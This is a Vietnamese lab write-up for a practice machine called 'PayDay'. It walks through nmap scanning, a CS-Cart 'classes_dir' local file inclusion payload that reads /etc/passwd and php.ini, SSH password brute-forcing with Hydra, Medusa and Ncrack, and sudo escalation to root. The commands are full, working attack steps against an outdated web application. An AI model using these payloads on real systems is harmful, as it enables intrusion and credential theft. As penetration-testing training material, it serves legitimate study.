# PayDay

## Summary

PayDay đã cài đặt phiên bản CS Cart lỗi thời, dễ bị tấn công bởi lỗ hổng Local File Inclusion. LFI có thể được sử dụng để xem file /etc/passwd, file này làm rò rỉ tên người dùng quan trọng. Sau đó, tên người dùng có thể được sử dụng để thực hiện tấn công brute-force để lấy mật khẩu của người dùng cho dịch vụ SSH.

## Enumeration

### Nmap

Bắt đầu bằng cách chạy scan `nmap`:

```
kali@kali:~$ sudo nmap -p- 192.168.120.85
Starting Nmap 7.80 ( https://nmap.org ) at 2020-03-24 13:39 EDT
Nmap scan report for 192.168.120.85
Host is up (0.032s latency).
Not shown: 65527 closed ports
PORT    STATE SERVICE
22/tcp  open  ssh
80/tcp  open  http
110/tcp open  pop3
139/tcp open  netbios-ssn
143/tcp open  imap
445/tcp open  microsoft-ds
993/tcp open  imaps
995/tcp open  pop3s

Nmap done: 1 IP address (1 host up) scanned in 45.15 seconds

kali@kali:~$ sudo nmap -A -sV -p 22,80,110,139,143,445,993,995 192.168.120.85
Starting Nmap 7.80 ( https://nmap.org ) at 2020-03-24 13:41 EDT
Nmap scan report for 192.168.120.85
Host is up (0.033s latency).

PORT    STATE SERVICE     VERSION
22/tcp  open  ssh         OpenSSH 4.6p1 Debian 5build1 (protocol 2.0)
| ssh-hostkey: 
|   1024 f3:6e:87:04:ea:2d:b3:60:ff:42:ad:26:67:17:94:d5 (DSA)
|_  2048 bb:03:ce:ed:13:f1:9a:9e:36:03:e2:af:ca:b2:35:04 (RSA)
80/tcp  open  http        Apache httpd 2.2.4 ((Ubuntu) PHP/5.2.3-1ubuntu6)
|_http-server-header: Apache/2.2.4 (Ubuntu) PHP/5.2.3-1ubuntu6
|_http-title: CS-Cart. Powerful PHP shopping cart software
110/tcp open  pop3        Dovecot pop3d
|_pop3-capabilities: PIPELINING STLS TOP SASL UIDL CAPA RESP-CODES
|_ssl-date: 2020-03-24T17:41:53+00:00; +11s from scanner time.
| sslv2: 
|   SSLv2 supported
|   ciphers: 
|     SSL2_RC2_128_CBC_EXPORT40_WITH_MD5
|     SSL2_RC4_128_EXPORT40_WITH_MD5
|     SSL2_RC4_128_WITH_MD5
|     SSL2_RC2_128_CBC_WITH_MD5
|_    SSL2_DES_192_EDE3_CBC_WITH_MD5
139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: MSHOME)
143/tcp open  imap        Dovecot imapd
|_imap-capabilities: IDLE LOGIN-REFERRALS SORT Capability MULTIAPPEND LITERAL+ SASL-IR OK NAMESPACE UNSELECT CHILDREN LOGINDISABLEDA0001 STARTTLS IMAP4rev1 completed THREAD=REFERENCES
|_ssl-date: 2020-03-24T17:41:53+00:00; +11s from scanner time.
| sslv2: 
|   SSLv2 supported
|   ciphers: 
|     SSL2_RC2_128_CBC_EXPORT40_WITH_MD5
|     SSL2_RC4_128_EXPORT40_WITH_MD5
|     SSL2_RC4_128_WITH_MD5
|     SSL2_RC2_128_CBC_WITH_MD5
|_    SSL2_DES_192_EDE3_CBC_WITH_MD5
445/tcp open  netbios-ssn Samba smbd 3.0.26a (workgroup: MSHOME)
993/tcp open  ssl/imaps?
|_ssl-date: 2020-03-24T17:41:53+00:00; +11s from scanner time.
| sslv2: 
|   SSLv2 supported
|   ciphers: 
|     SSL2_RC2_128_CBC_EXPORT40_WITH_MD5
|     SSL2_RC4_128_EXPORT40_WITH_MD5
|     SSL2_RC4_128_WITH_MD5
|     SSL2_RC2_128_CBC_WITH_MD5
|_    SSL2_DES_192_EDE3_CBC_WITH_MD5
995/tcp open  ssl/pop3s?
|_ssl-date: 2020-03-24T17:41:53+00:00; +11s from scanner time.
| sslv2: 
|   SSLv2 supported
|   ciphers: 
|     SSL2_RC2_128_CBC_EXPORT40_WITH_MD5
|     SSL2_RC4_128_EXPORT40_WITH_MD5
|     SSL2_RC4_128_WITH_MD5
|     SSL2_RC2_128_CBC_WITH_MD5
|_    SSL2_DES_192_EDE3_CBC_WITH_MD5
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: WAP|general purpose|switch|specialized|media device
Running (JUST GUESSING): Linux 2.4.X|2.6.X (94%), AVM embedded (93%), Extreme Networks ExtremeXOS 12.X|15.X (93%), Google embedded (93%), HP embedded (93%), Philips embedded (93%)
OS CPE: cpe:/o:linux:linux_kernel:2.4.20 cpe:/o:linux:linux_kernel:2.6.34 cpe:/h:avm:fritz%21box_fon_wlan_7170 cpe:/o:extremenetworks:extremexos:12.5.4 cpe:/o:extremenetworks:extremexos:15.3 cpe:/o:linux:linux_kernel:2.4.21
Aggressive OS guesses: Tomato 1.27 - 1.28 (Linux 2.4.20) (94%), DD-WRT v24-presp2 (Linux 2.6.34) (94%), Linux 2.6.22 (94%), Linux 2.6.18 - 2.6.22 (94%), AVM FRITZ!Box FON WLAN 7170 WAP (93%), Extreme Networks ExtremeXOS 12.5.4 (93%), Extreme Networks ExtremeXOS 15.3 (93%), Google Mini search appliance (93%), HP Brocade 4Gb SAN switch or (93%), Linux 2.4.20 (93%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
|_clock-skew: mean: 40m10s, deviation: 1h37m58s, median: 10s
|_nbstat: NetBIOS name: PAYDAY, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
| smb-os-discovery: 
|   OS: Unix (Samba 3.0.26a)
|   Computer name: payday
|   NetBIOS computer name: 
|   Domain name: 
|   FQDN: payday
|_  System time: 2020-03-24T13:41:40-04:00
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
|_smb2-time: Protocol negotiation failed (SMB2)

TRACEROUTE (using port 80/tcp)
HOP RTT      ADDRESS
1   34.83 ms 192.168.118.1
2   35.63 ms 192.168.120.85

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 165.51 seconds
```

### Web Enumeration

Máy chủ web đang chạy phiên bản dễ bị tấn công của ứng dụng CS-Cart trên cổng 80:

![alt text](image.png)

```
kali@kali:~$ curl -s http://192.168.120.85/ | head
<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN">
<html>

<head>
<title>CS-Cart. Powerful PHP shopping cart software</title>
<meta http-equiv="content-type" content="text/html; charset=iso-8859-1">
<meta name="description" content="The powerful shopping cart software for web stores and e-commerce enabled webstores is based on PHP / PHP4 with MySQL database with highly configurable implementation base on templates.">
<meta name="keywords" content="cs-cart, cscart, shopping cart, cart, online shop software, e-shop, e-commerce, store, php, php4, mysql, web store, gift certificates, wish list, best sellers">
<link href="/skins/new_vision_blue/customer/styles.css" rel="stylesheet" type="text/css">
<link href="/skins/new_vision_blue/customer/js_menu/theme.css" type="text/css" rel="stylesheet">
kali@kali:~$
```

Tra cứu "CS-Cart" trong EDB sẽ chỉ đến https://www.exploit-db.com/exploits/14962 là một trong những mục liên quan đến file cài đặt /install.php. Mục này nêu rõ như sau:

```
Nếu "install.php" không bị xóa sau khi cài đặt, chỉ cần tạo một tệp html với code sau và thay thế <Victim Server> bằng PATH tới "install.php" ví dụ: "http://www.nonexistant.com/install.php":
```

Với thông tin này, có thể enumerate phiên bản của ứng dụng - phiên bản `1.3.6`:

```
kali@kali:~$ curl -s http://192.168.120.85/install.php | grep -i version
                        <td valign="bottom"><p style="font-weight: bold; font-size: 11px;">Version:&nbsp;1.3.3&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</p></td>
kali@kali:~$
```

Searchsploit tiết lộ lỗ hổng `"CS-Cart 1.3.3 - 'classes_dir' Remote File Inclusion"`:

```
kali@kali:~$ searchsploit "cs-cart"
------------------------------------------------------------------------- ----------------------------------------
 Exploit Title                                                           |  Path
                                                                         | (/usr/share/exploitdb/)
------------------------------------------------------------------------- ----------------------------------------
CS-Cart - Multiple SQL Injections                                        | exploits/php/webapps/27030.txt
CS-Cart 1.3.2 - 'index.php' Cross-Site Scripting                         | exploits/php/webapps/31443.txt
CS-Cart 1.3.3 - 'classes_dir' Remote File Inclusion                      | exploits/php/webapps/1872.txt
CS-Cart 1.3.3 - 'install.php' Cross-Site Scripting                       | exploits/multiple/webapps/14962.txt
CS-Cart 1.3.5 - Authentication Bypass                                    | exploits/php/webapps/6352.txt
CS-Cart 2.0.0 Beta 3 - 'Product_ID' SQL Injection                        | exploits/php/webapps/8184.txt
CS-Cart 2.0.5 - 'reward_points.post.php' SQL Injection                   | exploits/php/webapps/33146.txt
CS-Cart 2.2.1 - 'products.php' SQL Injection                             | exploits/php/webapps/36093.txt
CS-Cart 4.2.4 - Cross-Site Request Forgery                               | exploits/php/webapps/36358.html
CS-Cart 4.3.10 - XML External Entity Injection                           | exploits/php/webapps/40770.txt
------------------------------------------------------------------------- ----------------------------------------
Shellcodes: No Result
kali@kali:~$ file /usr/share/exploitdb/exploits/php/webapps/1872.txt
/usr/share/exploitdb/exploits/php/webapps/1872.txt: ASCII text, with CRLF line terminators
kali@kali:~$
```

Ngoài ra, dirb tìm thấy thư mục `/classes/`:

```
kali@kali:~$ dirb http://192.168.120.85/

-----------------
DIRB v2.22    
By The Dark Raver
-----------------

START_TIME: Wed Mar 25 08:35:38 2020
URL_BASE: http://192.168.120.85/
WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt

-----------------

GENERATED WORDS: 4612                                                          

---- Scanning URL: http://192.168.120.85/ ----
==> DIRECTORY: http://192.168.120.85/addons/                                                                     
+ http://192.168.120.85/admin (CODE:200|SIZE:9471)                                                               
+ http://192.168.120.85/admin.php (CODE:200|SIZE:9471)                                                           
==> DIRECTORY: http://192.168.120.85/catalog/                                                                    
+ http://192.168.120.85/cgi-bin/ (CODE:403|SIZE:308)                                                             
+ http://192.168.120.85/chart (CODE:200|SIZE:0)                                                                  
==> DIRECTORY: http://192.168.120.85/classes/                                                                    
+ http://192.168.120.85/config (CODE:200|SIZE:13)                                                                
==> DIRECTORY: http://192.168.120.85/core/                                                                       
+ http://192.168.120.85/image (CODE:200|SIZE:1971)                                                               
==> DIRECTORY: http://192.168.120.85/images/                                                                     
==> DIRECTORY: http://192.168.120.85/include/                                                                    
+ http://192.168.120.85/index (CODE:200|SIZE:28074)                                                              
+ http://192.168.120.85/index.php (CODE:200|SIZE:28074)                                                          
+ http://192.168.120.85/init (CODE:200|SIZE:13)                                                                  
+ http://192.168.120.85/install (CODE:200|SIZE:7731)                                                             
==> DIRECTORY: http://192.168.120.85/payments/                                                                   
+ http://192.168.120.85/prepare (CODE:200|SIZE:0)                                                                
+ http://192.168.120.85/server-status (CODE:403|SIZE:313)                                                        
==> DIRECTORY: http://192.168.120.85/skins/                                                                      
+ http://192.168.120.85/store_closed (CODE:200|SIZE:575)                                                         
+ http://192.168.120.85/Thumbs.db (CODE:200|SIZE:1)                                                              
==> DIRECTORY: http://192.168.120.85/var/
```

Khi xem thư mục đó (http://192.168.120.85/classes/fckeditor/_whatsnew.html), chúng ta thấy phiên bản `2.2 FCKeditor`. FCKeditor (sau này được đổi tên thành CKEditor), là một thư viện của bên thứ ba phổ biến chứa nhiều lỗ hổng khác nhau. Ứng dụng này dễ bị tấn công bởi https://www.exploit-db.com/exploits/17644 (tải lên tệp tùy ý) và https://www.exploit-db.com/exploits/1964/ (RCE) với một số thay đổi.

```
kali@kali:~$ searchsploit fckeditor core
------------------------------------------------------------------------- ----------------------------------------
 Exploit Title                                                           |  Path
                                                                         | (/usr/share/exploitdb/)
------------------------------------------------------------------------- ----------------------------------------
FCKEditor Core - 'Editor 'spellchecker.php' Cross-Site Scripting         | exploits/php/webapps/37457.html
FCKEditor Core - 'FileManager test.html' Arbitrary File Upload (1)       | exploits/php/webapps/12254.txt
FCKEditor Core - 'FileManager test.html' Arbitrary File Upload (2)       | exploits/php/webapps/17644.txt
FCKEditor Core 2.x 2.4.3 - 'FileManager upload.php' Arbitrary File Uploa | exploits/php/webapps/15484.txt
FCKEditor Core ASP 2.6.8 - Arbitrary File Upload Protection Bypass       | exploits/asp/webapps/23005.txt
------------------------------------------------------------------------- ----------------------------------------
Shellcodes: No Result
kali@kali:~$ file /usr/share/exploitdb/exploits/php/webapps/17644.txt
/usr/share/exploitdb/exploits/php/webapps/17644.txt: ASCII text, with CRLF line terminators
kali@kali:~$
```

## Exploitation

### CS-Cart Local File Inclusion Vulnerability

Lỗ hổng đang được đề cập là https://www.exploit-db.com/exploits/1872/ và có thể khai thác như sau:

```
kali@kali:~$ curl 'http://192.168.120.85/classes/phpmailer/class.cs_phpmailer.php?classes_dir=/etc/passwd%00'
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/bin/sh
bin:x:2:2:bin:/bin:/bin/sh
sys:x:3:3:sys:/dev:/bin/sh
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/bin/sh
man:x:6:12:man:/var/cache/man:/bin/sh
lp:x:7:7:lp:/var/spool/lpd:/bin/sh
mail:x:8:8:mail:/var/mail:/bin/sh
news:x:9:9:news:/var/spool/news:/bin/sh
uucp:x:10:10:uucp:/var/spool/uucp:/bin/sh
proxy:x:13:13:proxy:/bin:/bin/sh
www-data:x:33:33:www-data:/var/www:/bin/sh
backup:x:34:34:backup:/var/backups:/bin/sh
list:x:38:38:Mailing List Manager:/var/list:/bin/sh
irc:x:39:39:ircd:/var/run/ircd:/bin/sh
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/bin/sh
nobody:x:65534:65534:nobody:/nonexistent:/bin/sh
dhcp:x:100:101::/nonexistent:/bin/false
syslog:x:101:102::/home/syslog:/bin/false
klog:x:102:103::/home/klog:/bin/false
mysql:x:103:107:MySQL Server,,,:/var/lib/mysql:/bin/false
dovecot:x:104:111:Dovecot mail server,,,:/usr/lib/dovecot:/bin/false
postfix:x:105:112::/var/spool/postfix:/bin/false
sshd:x:106:65534::/var/run/sshd:/usr/sbin/nologin
patrick:x:1000:1000:patrick,,,:/home/patrick:/bin/bash
<br />
<b>Fatal error</b>:  Class 'PHPMailer' not found in <b>/var/www/classes/phpmailer/class.cs_phpmailer.php</b> on line <b>6</b><br />
kali@kali:~$
```

Lưu ý rằng việc remote file inclusion sẽ không hoạt động trong trường hợp này. Bằng cách sử dụng base64, có thể đọc bất kỳ tệp nào trên hệ thống (nếu không, nó sẽ thực thi tất cả các tệp *.php):

```
kali@kali:~$ curl -s 'http://192.168.120.85/classes/phpmailer/class.cs_phpmailer.php?classes_dir=php://filter/read=convert.base64-encode/resource=/etc/php5/apache2/php.ini%00'| base64 -d 2>/dev/null
[PHP]

;;;;;;;;;;;
; WARNING ;
;;;;;;;;;;;
; This is the default settings file for new PHP installations.
; By default, PHP installs itself with a configuration suitable for
; development purposes, and *NOT* for production purposes.
; For several security-oriented considerations that should be taken
; before going online with your site, please consult php.ini-recommended
; and http://php.net/manual/en/security.php.


;;;;;;;;;;;;;;;;;;;
; About php.ini   ;
;;;;;;;;;;;;;;;;;;;

...
```

Bây giờ có thể thấy `allow_url_include` bị vô hiệu hóa, không cho phép thực hiện các cuộc tấn công RFI. Từ file `passwd` đã lấy được, lưu ý người dùng sau:

```
patrick:x:1000:1000:patrick,,,:/home/patrick:/bin/bash
```

### SSH via Guessing

Có thể đoán mật khẩu của Patrick là `patrick` và chỉ cần SSH vào máy (hoặc sử dụng mô-đun metasploit phụ trợ `use auxiliary/scanner/ssh/ssh_login` hoặc có thể sử dụng Hydra để tấn công bằng cách brute-force SSH authentication).

```
kali@kali:~$ ssh patrick@192.168.120.85
The authenticity of host '192.168.120.85 (192.168.120.85)' can't be established.
RSA key fingerprint is SHA256:4cNPcDOXrXdUvuqlTmFzow0HNSvJ1pXoNPKTZViNTYA.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '192.168.120.85' (RSA) to the list of known hosts.
patrick@192.168.120.85's password: 
Linux payday 2.6.22-14-server #1 SMP Sun Oct 14 23:34:23 GMT 2007 i686

The programs included with the Ubuntu system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.
patrick@payday:~$ id
uid=1000(patrick) gid=1000(patrick) groups=4(adm),20(dialout),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),104(scanner),115(lpadmin),1000(patrick)
patrick@payday:~$
```

```
kali@kali:~$ echo patrick > users.txt
```

### SSH Password Bruteforce Using Hydra

```
kali@kali:~$ hydra -L users.txt -P users.txt -e nsr -q ssh://192.168.120.85 -t 4 -w 5 -f
Hydra v9.0 (c) 2019 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2020-03-25 09:00:39
[DATA] max 4 tasks per 1 server, overall 4 tasks, 4 login tries (l:1/p:4), ~1 try per task
[DATA] attacking ssh://192.168.120.85:22/
[22][ssh] host: 192.168.120.85   login: patrick   password: patrick
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2020-03-25 09:00:40
kali@kali:~$
```

### SSH Password Bruteforce Using Medusa

```
kali@kali:~$ medusa -h 192.168.120.85 -U users.txt -P users.txt -M ssh -e ns -f -g 5 -r 0 -b -t 2 -v 4
ACCOUNT FOUND: [ssh] Host: 192.168.120.85 User: patrick Password: patrick [SUCCESS]
kali@kali:~$
```

### SSH Password Bruteforce Using Ncrack

```
kali@kali:~$ ncrack 192.168.120.85 -U users.txt -P users.txt -p ssh -f -v

Starting Ncrack 0.7 ( http://ncrack.org ) at 2020-03-25 09:03 EDT

Discovered credentials on ssh://192.168.120.85:22 'patrick' 'patrick'
ssh://192.168.120.85:22 finished.

Discovered credentials for ssh on 192.168.120.85 22/tcp:
192.168.120.85 22/tcp ssh: 'patrick' 'patrick'

Ncrack done: 1 service scanned in 3.01 seconds.
Probes sent: 1 | timed-out: 0 | prematurely-closed: 0

Ncrack finished.
kali@kali:~$
```

## Escalation

### Local Enumeration

```
patrick@payday:~$ sudo -l

We trust you have received the usual lecture from the local System
Administrator. It usually boils down to these three things:

    #1) Respect the privacy of others.
    #2) Think before you type.
    #3) With great power comes great responsibility.

[sudo] password for patrick:
User patrick may run the following commands on this host:
    (ALL) ALL
```

### Sudo 

Vì user `patrick` được phép chạy tất cả các lệnh, chỉ cần sử dụng "sudo su" để chuyển lên quyền `root`.

```
patrick@payday:~$ sudo su
root@payday:/home/patrick# id
uid=0(root) gid=0(root) groups=0(root)
```